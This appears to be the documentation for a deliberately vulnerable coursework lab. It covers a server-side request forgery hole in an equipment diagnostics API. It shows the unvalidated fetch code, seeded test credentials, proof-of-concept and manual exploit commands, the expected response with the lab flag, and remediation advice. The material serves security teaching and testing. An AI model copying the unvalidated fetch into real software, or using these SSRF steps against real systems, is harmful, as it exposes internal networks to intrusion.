# V3 — Server-Side Request Forgery in Equipment Diagnostics

> **Intentional coursework vulnerability.** This application is a
> deliberately vulnerable security lab (see `SECURITY-LAB-NOTICE.md`). Do
> not "fix" this endpoint; do not deploy. All data is synthetic.

## Summary

| Item | Value |
|---|---|
| Vulnerability | Server-side request forgery (SSRF) — the server fetches a caller-controlled URL |
| Endpoint | `POST /api/diagnostics/fetch` |
| Vulnerable parameter | `target` (body field, inside the RC4 envelope) |
| Attacker model | any authenticated **technician** (seeded `tech1` / `TechPass!23` — documented in the README, so V3 is independent of V1) |
| Impact | the api container becomes a request proxy: it can reach the internal-only lab device, and anything else its network position can reach |
| Intended proof target | `http://lab-device:8080/api/admin` → challenge `LAB{ssrf_internal_device_reached}` |
| Exact location | `services/api/src/routes/diagnostics.js` — route `/fetch`, comment `// VULN-V3 (fetch endpoint)` |

## Why the endpoint is intentionally vulnerable

The legitimate sibling endpoint `POST /api/diagnostics/run` takes only an
`equipmentId` and fetches the target **stored in the database**
(`equipment.diagnostic_target`). `/fetch` instead takes the URL from the
request body and hands it straight to `fetch()` with **no allowlist, no
loopback / 127.0.0.1 / private-range / link-local blocking, and redirects
followed**:

```js
// services/api/src/routes/diagnostics.js (route POST /fetch)
async function fetchTarget(target) {
  const started = Date.now();
  // VULN-V3 (fetch endpoint): `target` is caller-controlled and there is
  // deliberately no URL validation here — no scheme/host allowlist, no
  // loopback or private-range blocking. Redirects are followed.
  const resp = await fetch(target, { redirect: 'follow', signal: AbortSignal.timeout(FETCH_TIMEOUT_MS) });
  const text = (await resp.text()).slice(0, MAX_BODY_CHARS);
  return { resp, text, durationMs: Date.now() - started };
}
```

The fetched body is then returned to the caller verbatim (capped at
100 000 chars), so whatever the server can read, the caller reads.

The lab-device container is attached only to the `internal: true`
`lab-internal` network and publishes no host port, so the **host** has no
route to it (asserted by `scripts/verify-device.sh` checks 7a/7b). The
**api container** does. The attack chain is therefore:

```
host -> api (127.0.0.1:3000, RC4 envelope) -> lab-device:8080
```

not `host -> lab-device`, which remains impossible.

## Protocol requirement

Like every other protected endpoint, the request travels **inside the RC4
envelope** — there is no plaintext shortcut:

1. `POST /api/session/key` → fresh `{sessionId, key}`.
2. `POST /api/auth/login` (encrypted) as a technician → app token.
3. Encrypt `{token, equipmentId, target}` → envelope; `POST
   /api/diagnostics/fetch`.
4. Decrypt the response envelope; the fetched body is in the `body` field.

## Test user

| Item | Value |
|---|---|
| Role required | `technician` (students get 403) |
| Seeded credentials | `tech1` / `TechPass!23` (README seed table) |
| V1 token needed? | **No** — V3 is independently exploitable without the V1 token |

## Reproduction

### Automated PoC (preferred)

```bash
docker compose exec api node scripts/poc-v3-ssrf.js
```

Handshake → technician login → control `/run` → `/fetch` of
`http://lab-device:8080/api/admin` → asserts the challenge string is
present in the decrypted API response. Exit code 0 = confirmed.

### Manual, with lab-client.js

lab-client.js does not send custom headers, but V3 needs none — the
target is a body field:

```bash
docker compose exec api node scripts/lab-client.js \
  --endpoint /api/auth/login \
  --payload '{"username":"tech1","password":"TechPass!23"}'

docker compose exec api node scripts/lab-client.js \
  --endpoint /api/diagnostics/fetch \
  --payload '{"equipmentId":1,"target":"http://lab-device:8080/api/admin"}'
```

## Expected response

```json
{
  "equipmentId": 1,
  "assetTag": "EQ-1001",
  "target": "http://lab-device:8080/api/admin",
  "httpStatus": 200,
  "body": "{\"notice\":\"SYNTHETIC challenge value for the security-lab SSRF exercise (Phase 5). NOT a real credential.\",\"challenge\":\"LAB{ssrf_internal_device_reached}\",\"access\":\"internal-network-only\"}",
  "durationMs": 12
}
```

The `challenge` value `LAB{ssrf_internal_device_reached}` — which the host
cannot fetch directly — is returned through the API. (Note: `lab-client.js`
prints the whole envelope, decrypted, so the challenge is directly visible
in its output.)

## Exact proof

Asserted by `services/api/test/phase5.test.js` (test 3) and
`scripts/poc-v3-ssrf.js`:

1. **Isolation (verify-device.sh 7a/7b):** from the host, both
   `curl http://127.0.0.1:8080/api/status` and
   `curl http://lab-device:8080/api/status` **fail** — the device is
   unreachable directly.
2. **Exploit (phase5 test 3):** a technician sends
   `{equipmentId: 1, target: "http://lab-device:8080/api/admin"}` through
   the encrypted envelope; the API responds 200 and the decrypted body
   **contains `LAB{ssrf_internal_device_reached}`** — data only available
   on the internal network, retrieved by the server on the caller's behalf.
3. **Control (phase5 tests 1–2):** the same technician using `/run` gets
   only the configured target; students are denied 403; missing/invalid
   input is rejected 400/404; an unreachable target returns 502
   `fetch_failed` (it is not a generic proxy error path — the fetch really
   happens server-side).

## Negative controls

| # | Check | Where |
|---|---|---|
| 1 | Student (non-technician) cannot use `/fetch` → 403 | phase5 test 2 |
| 2 | Unknown `equipmentId` → 404; missing/invalid `target` → 400 | phase5 test 2 |
| 3 | Unreachable target → 502 `fetch_failed`, failed run recorded | phase5 test 2 |
| 4 | Plaintext request (no envelope) → 400 `missing_sid`; unknown sid → 401 | phase5 test 5 |
| 5 | Unauthenticated (no login token) → 401 `auth_required` | phase5 test 5 |
| 6 | Device still host-inaccessible: no published port, host curls fail | scripts/verify-device.sh (7a/7b) |

## Remediation guidance

In a real application:

* never fetch caller-controlled URLs; fetch only a target stored
  server-side per equipment record (as `/run` does), selected by ID;
* if a URL must be accepted, parse it and enforce a strict scheme/host
  allowlist, and explicitly block loopback, link-local, and private
  ranges (both IPv4 and IPv6 literals, including decimal/octal forms);
* disable redirects, or re-validate every redirect hop against the
  same policy;
* egress-firewall the service so a compromised fetch cannot reach
  anything beyond the intended targets, and use a DNS resolver that
  pins the checked IP through connection time (no rebinding gap).

Do **not** apply any of this to the lab build: the unvalidated fetch is
the coursework vulnerability, and the exercises depend on it.

## Reset procedure

```bash
docker compose down -v      # drops the database volume (diagnostic_runs too)
docker compose up -d --wait
```

Every `/run` and `/fetch` call records a `diagnostic_runs` row (status
`completed`/`failed`); these are synthetic and accumulate safely. Nothing
else is mutated.
